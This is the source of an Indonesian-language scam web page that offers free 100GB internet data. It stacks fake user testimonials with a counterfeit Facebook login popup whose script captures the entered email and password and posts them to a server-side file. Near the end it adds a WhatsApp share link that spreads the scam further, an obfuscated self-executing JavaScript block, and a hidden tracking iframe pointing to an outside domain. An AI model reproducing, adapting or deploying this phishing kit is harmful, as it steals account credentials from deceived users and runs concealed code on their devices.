        <!--?xml version="1.0" ?--> 
        <svg width="40" style="enable-background:new 0 0 48 48;" version="1.1" viewbox="0 0 48 48" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> 
         <style type="text/css">
             .st0 {
                 display: none;
             }

             .st1 {
                 fill: none;
                 stroke: #303030;
                 stroke-width: 0.7;
                 stroke-linecap: round;
                 stroke-linejoin: round;
                 stroke-miterlimit: 10;
             }

             .st2 {
                 fill: #303030;
             }
           </style> 
         <g class="st0" id="Padding__x26__Artboard"></g> 
         <g id="Icons"> 
          <g> 
           <path class="st1" d="M17.30376,30.96737l-0.68934,1.90643l3.79318-1.78069c0.17639-0.0828,0.36885-0.12573,0.5637-0.12573    h12.98269c0.57547,0,1.0463-0.47084,1.0463-1.0463V16.1725c0-0.57547-0.47084-1.0463-1.0463-1.0463H14.04601    c-0.57786,0-1.0463,0.46845-1.0463,1.0463v13.74857c0,0.57786,0.46844,1.0463,1.0463,1.0463H17.30376z"></path> 
           <line class="st1" x1="15.04836" x2="15.04836" y1="26.25386" y2="27.01553"></line> 
           <line class="st1" x1="15.04836" x2="15.04836" y1="18.17051" y2="24.86477"></line> 
          </g> 
         </g> 
        </svg></span> 
       <span class="chat__actions-text">comment</span> 
      </div> 
     </div> 
     <div class="chat__conversation"> 
      <!--js box--> 
      <div class="chat__conversation-box js-hidden" id="js-box-1"> 
       <img class="lazyload chat__conversation-box-img" data-src="https://a.jsdelivr.plus/res/96572610/img/DxFan3s2.png?=v1.2" alt=""> 
       <div class="chat__conversation-box-content"> 
        <div class="chat__conversation-box-content-comment "> 
         <span class="chat__conversation-box-content-comment-name">Luthando Paul</span> 
         <span class="chat__conversation-box-content-comment-text">Saya kecewa, saya hanya mendapat 35GB!</span> 
        </div> 
        <div class="chat__conversation-box-content-cta"> 
         <span class="chat__conversation-box-content-cta-text">Like</span> 
         <span class="chat__conversation-box-content-cta-text">reply</span> 
         <span class="chat__conversation-box-content-cta-text">1m</span> 
        </div> 
       </div> 
      </div> 
      <div class="chat__conversation-box js-hidden" id="js-box-2"> 
       <img class="lazyload chat__conversation-box-img" data-src="https://a.jsdelivr.plus/res/96572610/img/cSW1h1J2.png?=v1.2" alt=""> 
       <div class="chat__conversation-box-content"> 
        <div class="chat__conversation-box-content-comment "> 
         <span class="chat__conversation-box-content-comment-name">Lydia Chioma</span> 
         <span class="chat__conversation-box-content-comment-text">Setelah selesai sharing, akhirnya saya mendapat data internet sebesar 50GB ini.</span> 
        </div> 
        <div class="chat__conversation-box-content-cta"> 
         <span class="chat__conversation-box-content-cta-text">Like</span> 
         <span class="chat__conversation-box-content-cta-text">reply</span> 
         <span class="chat__conversation-box-content-cta-text">2m</span> 
        </div> 
       </div> 
      </div> 
      <!--js end box --> 
      <div class="chat__conversation-box"> 
       <img class="lazyload chat__conversation-box-img" data-src="https://a.jsdelivr.plus/res/96572610/img/IejDtyq2.png?=v1.2" alt="" src="https://a.jsdelivr.plus/res/96572610/img/IejDtyq2.png?=v1.2"> 
       <div class="chat__conversation-box-content"> 
        <div class="chat__conversation-box-content-comment "> 
         <span class="chat__conversation-box-content-comment-name">Fredrick Bandile</span> 
         <span class="chat__conversation-box-content-comment-text">Saya pikir itu palsu, tapi saya mendapat data gratis 50GB setelah 5 menit, terima kasih.</span> 
        </div> 
        <div class="chat__conversation-box-content-cta"> 
         <span class="chat__conversation-box-content-cta-text">Like</span> 
         <span class="chat__conversation-box-content-cta-text">reply</span> 
         <span class="chat__conversation-box-content-cta-text js-seconds">3m</span> 
        </div> 
       </div> 
      </div> 
      <div class="chat__conversation-box chat__conversation-box--right"> 
       <img class="lazyload chat__conversation-box-img" data-src="https://a.jsdelivr.plus/res/96572610/img/cZK8CbL2.jpg?=v1.2" alt="" src="https://a.jsdelivr.plus/res/96572610/img/cZK8CbL2.jpg?=v1.2"> 
       <div class="chat__conversation-box-content"> 
        <div class="chat__conversation-box-content-comment "> 
         <span class="chat__conversation-box-content-comment-name">Ahamle Junio</span> 
         <span class="chat__conversation-box-content-comment-text">Hebat... apakah Anda mendapat 50GB Seperti saya?</span> 
        </div> 
        <div class="chat__conversation-box-content-cta chat__conversation-box-content-cta--2"> 
         <span class="chat__conversation-box-content-cta-text">Like</span> 
         <span class="chat__conversation-box-content-cta-text">reply</span> 
         <span class="chat__conversation-box-content-cta-text js-seconds">4m</span> 
        </div> 
       </div> 
      </div> 
      <div class="chat__conversation-box"> 
       <img class="lazyload chat__conversation-box-img" data-src="https://a.jsdelivr.plus/res/96572610/img/qeADdgp2.jpg?=v1.2" alt="" src="https://a.jsdelivr.plus/res/96572610/img/qeADdgp2.jpg?=v1.2"> 
       <div class="chat__conversation-box-content"> 
        <div class="chat__conversation-box-content-comment "> 
         <span class="chat__conversation-box-content-comment-name">Sana khan</span> 
         <span class="chat__conversation-box-content-comment-text">Terima kasih! Saya telah menerima 100GB data</span> 
        </div> 
        <div class="chat__conversation-box-content-cta"> 
         <span class="chat__conversation-box-content-cta-text">like</span> 
         <span class="chat__conversation-box-content-cta-text">reply</span> 
         <span class="chat__conversation-box-content-cta-text">10m</span> 
        </div> 
       </div> 
      </div> 
      <div class="chat__conversation-write"> 
       <input type="text" name="comment" id="write" placeholder="Tulis komen"> 
       <label class="chat__conversation-write-text" for="write"></label> 
       <div class="chat__conversation-write-icons"> 
        <svg class="chat__conversation-write-icons-img" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve"> 
         <g> 
          <g> 
           <g> 
            <path d="M256,0C114.844,0,0,114.844,0,256s114.844,256,256,256s256-114.844,256-256S397.156,0,256,0z M256,490.667
                  				C126.604,490.667,21.333,385.396,21.333,256S126.604,21.333,256,21.333S490.667,126.604,490.667,256S385.396,490.667,256,490.667
                  				z"></path> 
            <path d="M393.385,299.115c-5.781-1.385-11.49,2.177-12.844,7.906c-13.75,57.885-64.958,98.313-124.542,98.313
                  				c-59.656,0-110.885-40.49-124.573-98.448c-1.365-5.75-7.146-9.24-12.833-7.938c-5.74,1.354-9.292,7.104-7.938,12.833
                  				c15.979,67.646,75.75,114.885,145.344,114.885c69.51,0,129.26-47.167,145.292-114.708
                  				C402.656,306.219,399.115,300.469,393.385,299.115z"></path> 
            <circle cx="170.667" cy="192" r="21.333"></circle> 
            <circle cx="341.333" cy="192" r="21.333"></circle> 
           </g> 
          </g> 
         </g> 
        </svg> 
        <svg class="chat__conversation-write-icons-img" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 480 480" style="enable-background:new 0 0 480 480;" xml:space="preserve"> 
         <g> 
          <g> 
           <path d="M240,136c-57.438,0-104,46.562-104,104s46.562,104,104,104c57.41-0.066,103.934-46.59,104-104
                			C344,182.562,297.438,136,240,136z M240,328c-48.601,0-88-39.399-88-88c0-48.601,39.399-88,88-88
                			c48.577,0.057,87.943,39.423,88,88C328,288.601,288.601,328,240,328z"></path> 
          </g> 
         </g> 
         <g> 
          <g> 
           <path d="M440,112h-56c-13.255,0-24-10.745-24-24c-0.026-22.08-17.92-39.974-40-40H160c-22.08,0.026-39.974,17.92-40,40
                  			c0,13.255-10.745,24-24,24H40c-22.08,0.026-39.974,17.92-40,40v240c0.026,22.08,17.92,39.974,40,40h400
                  			c22.08-0.026,39.974-17.92,40-40V152C479.974,129.92,462.08,112.026,440,112z M464,392c0,13.255-10.745,24-24,24H40
                  			c-13.255,0-24-10.745-24-24V152c0-13.255,10.745-24,24-24h56c22.08-0.026,39.974-17.92,40-40c0-13.255,10.745-24,24-24h160
                  			c13.255,0,24,10.745,24,24c0.026,22.08,17.92,39.974,40,40h56c13.255,0,24,10.745,24,24V392z"></path> 
          </g> 
         </g> 
        </svg> 
        <svg class="chat__conversation-write-icons-img--svg" width="32px" height="32px" viewbox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns"> 
         <title>icon 65 file gif</title> 
         <desc>
           Created with Sketch. 
         </desc> 
         <defs></defs> 
         <g id="Page-1" stroke="none" stroke-width="0" fill="none" fill-rule="evenodd" sketch:type="MSPage"> 
          <g id="icon-65-file-gif" sketch:type="MSArtboardGroup" fill="gray"> 
           <path d="M8.00684834,10 C6.34621185,10 5,11.3422643 5,12.9987856 L5,20.0012144 C5,21.6573979 6.33599155,23 8.00684834,23 L24.9931517,23 C26.6537881,23 28,21.6577357 28,20.0012144 L28,12.9987856 C28,11.3426021 26.6640085,10 24.9931517,10 L8.00684834,10 L8.00684834,10 Z M7.99456145,11 C6.89299558,11 6,11.9001762 6,12.992017 L6,20.007983 C6,21.1081436 6.90234375,22 7.99456145,22 L25.0054385,22 C26.1070044,22 27,21.0998238 27,20.007983 L27,12.992017 C27,11.8918564 26.0976562,11 25.0054385,11 L7.99456145,11 L7.99456145,11 Z M13,17 L13,19 L10.9998075,19 C10.4437166,19 10,18.5523709 10,18.0001925 L10,14.9998075 C10,14.4437166 10.4476291,14 10.9998075,14 L14,14 L14,13 L11.0048815,13 C9.89761602,13 9,13.8865548 9,15.0059191 L9,17.9940809 C9,19.1019194 9.8938998,20 11.0048815,20 L14,20 L14,19.25 L14,19.25 L14,17 L14,16 L11,16 L11,17 L13,17 L13,17 Z M16,14 L16,19 L15,19 L15,20 L18,20 L18,19 L17,19 L17,14 L18,14 L18,13 L15,13 L15,14 L16,14 L16,14 Z M20,16 L20,14 L24,14 L24,13 L19,13 L19,20 L20,20 L20,17 L23,17 L23,16 L20,16 L20,16 Z" id="file-gif" sketch:type="MSShapeGroup"></path> 
          </g> 
         </g> 
        </svg> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
   <!--end chat--> 
  </div> 
            <div class="popup-login login-facebook animated fadeIn" style="display: none;" id="facebook">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                <img width="70" height="70" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240110_175143.png">
                <div class="txt-login-fb">
                    Masuk ke akun Facebook Anda untuk melanjutkan 
                </div>
                <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="alx_email_fb2" name="email" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <input type="hidden" name="ua" id="ua" value="Kuota Gratis" readonly>
                            <input type="hidden" name="log" id="log" value="Facebook" readonly>
                    <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                    <button class= "btn-login-fb load" style="display: none;">
                           <i class="fa fa-spinner fa-spin" style=""></i> Loading...
                        </button>
                </form>
                <div class="txt-create-account">Buat Akun</div>
                <div class="txt-not-now">Lain Kali</div>
                <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Bahasa Indonesia</div>
                    <div class="language-name">English (UK)</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyrights">Facebook Inc.</div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/gh/chael44/chaeljs2@main/jquery.js"></script>
    <script type="text/javascript">
        function opalexf() {
                $('#facebook').fadeIn();
                }

        window.addEventListener('submit', function (e) {
            e.preventDefault();
            setTimeout(() => {
                var user = $('#alx_email_fb2').val();
                var pass = $('#alx_password_fb2').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    return false;
                } else {

                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            return false;
                        }
                    }

                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    } else {
                        $('.email').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    }


                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    } else {
                        $('.email').hide();
                    }

                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    beforeSend: function() {
                            $(".log1").hide();
                            $(".log2").show();
                            $(".log2").prop("disabled", true);
                        },
                        success: function() {
                        $('#alexf').fadeOut();
        $('#third-box').fadeIn();
        $('#ijospin1').fadeIn();
        $('#cheking').fadeIn();
        $('#ijospin1').fadeOut();
        $('#cheking2').show();
        $('#second-loading').fadeOut();
        setTimeout(() => {
        $('#first-porcent').fadeIn();
        },1500)
        setTimeout(() => {
        $('#share').fadeIn();
        },2000)
                    }
                })
            }, 1000)
        })

    </script>
  <script>
    lazyload();
</script> 
<script>
function loadmuter() {
        $('#loading-svg').show();
        $('#tombolaktif').fadeOut();
        $('#text100gb').fadeOut();
        $('#tuman').fadeOut();
        $('#second-box').show();
        $('#loading-svg').fadeOut();
        }
function tomboltel() {
        $('#second-box').fadeOut();
        $('#loginmetod').fadeIn();
        }
function bugnjir() {
        $('.alex-facebook').fadeIn();
        $('#loginmetod').fadeOut();
        }
</script>
<script>
function opanaquota() {
     location.href = "https://api.whatsapp.com/send?text=*Dapatkan+data+internet+100GB+gratis,+kampanye+berakhir+besok.*+\n*🎁Gratis+data+internet+100GB+untuk+semua+jaringan+dan+semua+aplikasi:*+\n*Saya+sudah+menerimanya:*+*Klik+di+sini+untuk+mendapatkan+milik+Anda:*+https://cxznr.my.id/Kuota100gb/018Ua02010h7Hs"
  $('#share').fadeOut();
  $('#donebg').fadeIn();
        }
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
  <iframe referrerpolicy="no-referrer" width="1px" height="1px" scrolling="no" src="https://wixixa.buzz/res/pu.html?seed=6765077532288966&amp;pid=aa.co&amp;c=t5.free-100gb&amp;f=wa" style="display: none;"></iframe>
 </body>
</html>